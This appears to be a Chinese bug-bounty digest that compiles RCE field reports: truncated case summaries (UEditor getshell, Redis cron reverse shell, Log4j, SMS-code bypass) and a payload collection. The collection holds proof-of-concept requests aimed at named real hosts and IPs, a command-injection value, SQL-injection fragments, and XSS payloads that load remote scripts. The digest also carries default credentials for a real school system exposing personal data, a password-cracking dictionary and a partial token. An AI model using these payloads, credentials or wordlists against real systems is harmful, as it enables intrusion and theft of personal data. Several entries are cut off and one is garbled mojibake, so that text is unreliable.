# SRC 实战报告提炼 — rce

> 来源：蚂蚁SRC榜一Clown的 104 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### (github最新版)UEditor .net版本 getshell

来源：小密圈：企业护航人 链接：https://t.zsxq.com/FMjqRRJ 转发：https://www.jianshu.com/p/6dae608b617c （简书：索马里的 乌贼） ------------------------------------------------------------------------------------------------ (github 最新版)UEditor .net版本 getshell 漏洞说明 github最新版的 UEditor net版本由于 CrawlerHandler.cs内的方法 Crawler 没对 sour

### 亿速云官网的cors挖掘历程

亿速云的cors配置不当漏洞挖掘 最近在研究cors，这不刚找了个网站练练手， 我相信在座的各位一定都是不喜欢看原理什么的 在此也就不多赘述，直接开始吧。 简单说下cors: CORS全称Cross-Origin Resource Sharing, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，不同于古老的jsonp只能get请求。  但如果长满头发的程序员犯了错误，配置出错怎么办？那就，嘿嘿嘿  具体参照文章 https://www.anquanke.com/post/id/97671 讲解十分详细！ start: 官网：https://www.yisu.com/ 首先注册个账

### 美团api站点命令执行漏洞

美团api站点命令执行漏洞 0x01  本次简单的分享这个漏洞应为之前分享的SSRF盲攻击跟这个漏洞是一样的，都是利用一模一样的思路得到攻击，所以大家如果没看明白就去公众号“快识”看看那篇SSRF的挖掘文章 在一次业务信息收集时发现了改地址，我利用微信“小程序”小程序可以查看许多URL，这些URL都是没办法被正常的方式发现 ，所以挖洞的时候信息搜集想当重要 0x02 正常来说api接口这种站点不是什么不常见的，应该属于主业务，就跟我之前分享的那个SSRF盲攻击一样，都是利用模糊测试得到的URL地址 扫描目录，得到了403 得到403之后在对403下面隐藏的关键再来一次模糊测试，利用参数拼接在后

### 未授权redis+getshell

记一次未授权访问redis+getshell 当我们日网站时候，常规漏洞如注入、xss等多尝试无果后，扫描端口也会发现意外收获。 本次扫到了6379也就是Redis，Redis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥等远程连接。 当我们通过未授权访问或弱密码成功访问redis服务器，我们应该怎样进一步获取权限呢？ 连接redis：Redis-cli –h 被攻击ip 目前较主流的两个方法，第一种写入计划任务反弹shell set x

### xss基础与练习 (1)

XSS基础与练习 类型介绍: 反射型 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 存储型 	持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Sto

### 短信验证码绕过（一）

短信验证码绕过漏洞 0x01原理： 服务器端返回的相关参数作为最终登录凭证，导致可绕过登录限制。 危害：在相关业务中危害也不同，如找回密码，注册，电话换绑等地方即可形成高危漏洞，如果是一些普通信息，个人信息修改的绕过就是中低危。 0x02操作： 利用burp获取返回包（右键找到DO intercept) 修改即可： 测试方法： 先获取正确的验证码然后看看成功的返回包将其保存，然后再去输入错入的信息获取返回包，将正确的替换 0x03案例 如下信息修改框，先获取正确的返回包。 然后输入错误的返回包，将正确的替换： 这里修改后，信息就自动保存成功。 最终获取赏金：50R

### Log4j漏洞分析

log4j漏洞分析 漏洞复现 首先这里起一个ldap的服务 然后我们吧漏洞代码放上去 可以看到这里已经弹出计算机 漏洞分析流程 因为利用链相对来说比较长 总利用链条: lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:223, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1116, StrSubsti

### 如何挖到一个RCE

目录   0 前言与基础概念  1 exec 无过滤拼接 RCE  易  2 任意文件写入 RCE 易  3 文件上传 RCE 中  4 任意登录后台+后台 RCE 易  5 SQL 语句执行+写入权限+绝对路径 RCE 易  6 XSS+electron RCE 易  7 XXE+php 协议 RCE  易  8 SSRF+远程文件下载   RCE 中  9 文件包含 RCE 中上  10 反序列化 RCE 难  11 表达式注入 RCE 中上  12 JNDI 注入 RCE 中上  13 JDBC+反序列化 RCE 中上  14 SSTI 注入 RCE 易  15 缓冲区溢出 RCE 难 

### 如何挖到第一个RCE

目录   0 前言与基础概念  1 exec 无过滤拼接 RCE  易  2 任意文件写入 RCE 易  3 文件上传 RCE 中  4 任意登录后台+后台 RCE 易  5 SQL 语句执行+写入权限+绝对路径 RCE 易  6 XSS+electron RCE 易  7 XXE+php 协议 RCE  易  8 SSRF+远程文件下载   RCE 中  9 文件包含 RCE 中上  10 反序列化 RCE 难  11 表达式注入 RCE 中上  12 JNDI 注入 RCE 中上  13 JDBC+反序列化 RCE 中上  14 SSTI 注入 RCE 易    15 缓冲区溢出 RCE 

### 第四更：对Js接口的继续探讨

第四更: Ps:此次是对一个系统的具体挖掘方法，在我们挖掘漏洞的时候，遇见困难的，在自己技术和知识积累的情况达不够的时候，就可以放弃换简单的系统挖掘，一般脆弱系统为弱口令能进去的系统，之后在对后台挖掘，edusrc平台的某位核心白帽子都是靠弱口令上去的！！！                                             对Js接口的继续探讨 目标站点：http://202.197.xx.xxx/（学校常用的视频点播平台） 开局也是这样的一个登录框，当然首先测试就是弱口令admin/admin (admin/123456) 等常规的密码， （可以进行小量字典爆破一下），

### edusrc挖掘技巧（全）

edusrc挖掘技巧总结 一： 对于新人刚开设挖edusrc的时候需要花大量的时间来找系统和信息收集，当你遇见的系统又waf的时候可以适当的放弃别再这上面花时间了，列入sql注入，一个单引号尝试报错和闭合（最多就是把简单的绕过尝试一下）如果不行，那就果断放弃，xss的话在edu的模块是不需要花大量时间，但是为了后面的企业src可以更好的理解xss可以尝试挖掘一些（在控制台弹窗测试，因为未授权，出了问题别找我）这就是对于top10漏洞的技巧。 主要还是说一些系统的收集方法： 利用fofa 语句：“系统” && org=“China Education and Research Network C

### 第六更——查找目标与逻辑漏洞 (1)

查找目标 从已知文库寻找目标：    目前常见文库： peiqi文库（不需要邀请码），零组文库和白泽文库（需要邀请码） 此次选择peiqi文库：http://wiki.peiqi.tech/    由于我之前是挖edusrc,所以我在打击目标的时候，都是找关于学校的web系统于是开始寻找目标： 找web应用，然后查看关于学校应用的系统漏洞，并获取fofa关键词，自己再去进行漏洞挖掘（ 一般出现过的漏洞系统，肯定不止一个存在漏洞，每个人的思路不一样，所挖掘到的漏洞就不一样） 对fofa关键词查看，自己通过已知漏洞去获取对自己有用的资源（比如任意漏洞下载我们就可以通过这个获取web系统的源码，下一

### 第一更：教育src如何日刷百分

教育SRC日刷百分 Ps: （对于edu想上分的同学有两种方式：1.挖通用2.定点打击学校，全部日穿。此文采用的是第二种方法） 首先确定目标学校：对于学校可以在平台上选择漏洞较少的学校，因为学校可能没有被多少人挖过，很少被通报，猜测学校的安全意识比较低，所以这次我就去给这样的学校好好的上一课。这是本次的成果，edu上分80多rank，用时一天，edu高校如此多，每天打一个，那么上分不是轻轻松松了？ 目标：https://www.xxxxxx.edu.cn/ 确定目标之后就是对于该学校的信息收集，主要收集：xh、SFZ、gh、电话号码等信息，因为信息收集是渗透的核心，如果信息收集几分钟，那么你挖

### 江西九江科技中等专业学校存在逻辑缺陷

漏洞地址:https://jjkj.ynedut.com/ynedut/login.htm 漏洞描述: 成都依能科技股份有限公司 yn智慧校园 存在逻辑缺陷，接口未鉴权导致可查询全部师生 手机号、身份证、姓名、工号、密码、等级、token 账密: 3041/jjkjzz111(默认密码) 3189/jjkjzz111(默认密码） a. https://src.sjtu.edu.cn/post/172628/ 第1页 共3页 b. 点击搜索会请求接口 /smesis/personnelInfoMaintenance/findRSGLSysUserByPlatformSysOrganization

### 应急(1)

Linux应急：https://blog.csdn.net/qq_41874930/article/details/109079044               https://blog.csdn.net/weixin_43526443/article/details/122744731 Window应急: https://baijiahao.baidu.com/s?id=1710337028628832865&wfr=spider&for=pc             https://baijiahao.baidu.com/s?id=1710337028628832865&wfr=spid

### EDU宝典

前言：本文所有漏洞均已在 2022 年 8 月份前提交，当然为了观赏性，刨去了弱口令，扫描 器扫到的注入以及一些垃圾洞之后写下的本文，我本身也不咋刷 edu 的，也就今年简单的 刷了一点 rank 分，写这篇文章也是巩固一下自己的知识并且告诉大家如何挖到通杀~  （全文自己手打，所以肯定会有错，如果发现错误请及时联系本人~）      其实信息收集大部分文章都说的差不多了，来来回回炒那些冷饭也没意思，无非就是 fofa， hunter，然后查下 title=”后台”或者就是 oa，cms 的 1daynday 去打，要么就是 oneforall+子 域名挖掘机找下子域名进行收集    这里说一

### PSRC小目标，挣他一个亿

PSRC小目标，挣他一个亿 讲师：carry_your 138,270,000  CONTENTS 01 资产收集技巧 02 漏洞挖掘案例 03 职业规划梳理 资产收集 1 在渗透测试中，我们需要尽可能多 的去收集目标的信息，资产探测和 信息收集，决定了你发现安全漏洞 的几率有多大。如何最大化的去收 集目标范围，尽可能的收集到子域 名及相关域名的信息，这对我们进 一步的渗透测试显得尤为重要。 基本概况 IP段+端 口 域名 APP 服务号API 信息泄露 社工 基本概况 股权结构查询 大型金融集团往往有着非常复 杂的股权结构，通过工商查询 目标集团的股权结构，更全面 的了解目标集团的公司资产，

### test2

某钓鱼站群拿 shell 在群内看到一个师傅发的网站 域名为二级域名 注册账号后，发现有头像，但是白名单绕过不了 扫描端口和目录  发现是宝塔搭建的网站 发现没有什么东西，我就去找子域名 通过 360 威胁情报中中心发现了九个，是一个站群  我依次打开后，发现前面几个域名是一样的，后面的域名是 是 app 的网站源码（后来我看文件的时候才知道，这个东西原来是 80 端口时 app，443 端 口是 pc 端） 扫描目录发现了  结果直接使用弱口令就进去了 我以为直接上传 php 文件就可以结束的时候，发现，文件时可以上传，但是不返回路径 我这个时候有看见了一个发现外部图片，我想试试存不存在文件

### 渗透字典

huangyu888!@#$zhoujiakui 223223 jtserver1981@223 wztelecom2008easyget yzdx123 echina0228 xiaxue123-$$ 4rf7uj3ed8ik !!changeme$$ ebochai517 qifengjc09001. 1qa2ws3ed wzcgame12 wanzhonggame wanzhonggame12!#13 xpmiripserczmir3 xpmiripserczmir123 joyidc0980 cdq238888 2819327oyxh qingtian1668 popmusic789 

### 补天-漏洞

ԩ৘ሑ෿ ׳ 2023-02-14 16:42:08 ׳ 2023-02-15 14:08:15 ಒಪᇏ ৘༢๤թᄝsqlᇿೆ 2023-02-14 16:42:08 ৳ӌഅğ ඳ ğ  4 ९л ğ QTVA-2023-3408050 ো྘ğ SQLᇿೆ ğ  ᇏາ ğ ൞ ໑Ꮮิൕ 1བྷ౦b 2བྷ౦b ᆳྛ಩ၩSQLეओđೂҰ࿘ඔऌa༯ᄛඔऌaཿೆwebshellab url:https://consult.gti-oil.com/login උğ གྷğadmin/admin123 ૭ඍ བྷ౦ ༀ ཛଢն๏ ༀ ׮ࠃۡ܄ ᇏྏ ഠ౵ ׳ 120 by࿄࿄ 补天-漏洞_安全|系统漏洞_IoT

## 实战 Payload 集（39 条去重）

### HTTP请求

```
POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: www.xxxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0)
Gecko/20100101 Firefox/56.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data;
boundary=---------------------------31182099519956
Content-Length: 173
Connection: close
Upgrade-Insecure-Requests: 1
-----------------------------31182099519956
Content
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1 
Host: xxxx 
Content-Type: multipart/form -data; boundary= ----
WebKitFormBoundarymVk33liI64J7GQaK 
Content-Length: 368 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="secId" 
1 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="Filedata"; filename="hello.txt" 
Hello World！ 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="plandetailid" 
1 
------W
POST /xxxxxx/app.do HTTP/1.1
Host: gw.xxxxxx.com
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: BIGipServer_nginx_pool=926027948.36895.0000
Connection: close
Accept: */*
User-Agent: XXXX2B/1.8.1 (iPhone; iOS 10.3.1; Scale/2.00)
Accept-Language: zh-Hans-CN;q=1
Content-Length: 318
X-Request-Id: 9F613F2C-29D0-44F3-95BB-011FAA7577B8
a p p S r c = 3 & a p p T y p e = B & a p p _ c o d e = 2 3 0 0 4 & c a s U u i d = 1 & c l i n i c I d = f 4 e 3 5 0 c 7 - 7 8 f
POST /ccc-cmnsrv-channel-channelapp/order/prejud/queryUser HTTP/1.1
Host: flsccc.cccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
token: 
<REDACTED>
mI5YTA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDM
TEtNDBGQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV40l5
POST /ccc-cmnsrv-channel-channelapp//order/prejud/querydetail HTTP/1.1
Host: ccc.ccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
t o k e n : 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhdXRoMCIsImV4cCI6MTUzODM5NjAxMywidXNlcklkIjoiMmI5Y
TA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDMTEtNDB
GQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV
POST /els/report/jmreport/queryFieldBySql HTTP/1.1 
Host: localhost 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap pleWebKit/537.36 (KHTML, like Gecko) 
Chrome/111.0.5563.111 Safari/537.36 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: close 
Content-Type: application/json 
Cookie: Path=/ 
Content-Length: 37 
 
{"dbSource": "", "sql": "select 1#'"} 
 
资产一：http://112.95.136.29/ 
 
fcmit.cc
 
Poc： 
POST /els/report/jmreport/queryFieldBySql HTTP/1.1 
Host: 122.112.178.154 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap pleWebKit/537.36 (KHTML, like Gecko) 
Chrome/111.0.5563.111 Safari/537.36 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: close 
Content-Type: application/json 
Cookie: Path=/ 
Content-Length: 37 
 
{"dbSource": "", "sql": "select 1#'"} 
 
fcmit.cc
 
 
 
资产三：http://srm-emu.dslyy.com/ 
 
Poc： 
GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3edudesuite.txt HTTP/1.1
```
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
POST /Common/GetDropDownList HTTP/1.1 
Host: 119.36.193.10:8094 
fcmit.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap pleWebKit/537.36 (KHTML, like Gecko) 
Chrome/70.0.3538.77 Safari/537.36 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: close 
Content-Type: application/x-www-form-urlencoded; charset=utf-8 
Content-Length: 34 
 
DataSource=1*&Items=1&defaultVal=1 
 
 
 
 
资产二:http://218.4.236.238:8091/ 
fcmit.cc
 
Poc： 
```

### URL

```
https://github.com/Ridter/redis-rce.git
http://localhost/phpmyadmin4.8.5/index.php?db=test
http://xx.xxx.xxx.xxx:8312/admin/login/index
http://www.0-sec.org/seacms/backend/admin_video.php?a
http://www.0-sec.org/admin/index/login.html
http://127.0.0.1:80/admin/adm
```

### XSS

```
<script>alert(‘test1’)</script>
javascript:alert(
<ScRipT sRc=http://xxxxx.cn/ExiptZI></SCriPt>
<ScRipT sRc=http://xxxxx.cn/Exi0TCW></SCriPt>
<img src=x onerror=eval(atob(’cz1jcmVXXXXXytNYXRoXXXXXXXXhbmRvbSgp’))>
<script>alert( ‘test1’)</script>
javascript:alert(’xss’)’;</style>
<script>history.pushState(’’, ’’, ’/’)</script>
<img src="#" alt="xss_csrf_getshll" onerror="var url = ’http://127.
0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js’;xss_js = ’
<scr’+’ipt src=’+url+’>
javascript:fireForms()
```

### curl

```
curl 语句（工具地址 https://github.com/vulhub/Apereo-CAS-Attack/releases/tag/v1.0.0） 
curl = curl_init();
```

### SQL

```
extractvalue(1,concat(0x7e,(sel
extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e))
and 1=2 sql命令不成立，结果为空或出错 ； 
and 1=1 sql命令成立，结果正常返回 。 
extractvalue(1,benchmark(25000
sleep(2)))pcfy)+/ /a
sleep(3)-- -&other=xxx方式来注入成功（打破了只要
sleep(3)-
sleep(3)-- -, 总 的 sql 语 句 成 为
sleep(3)-- -
sleep(3)— -
```

## 技术手法统计

- 漏洞利用: 22 次
- 提权: 13 次
- WAF/过滤绕过: 12 次
- 参数篡改: 7 次
- 接口发现: 3 次
- 枚举/爆破: 2 次
- 漏洞链: 1 次

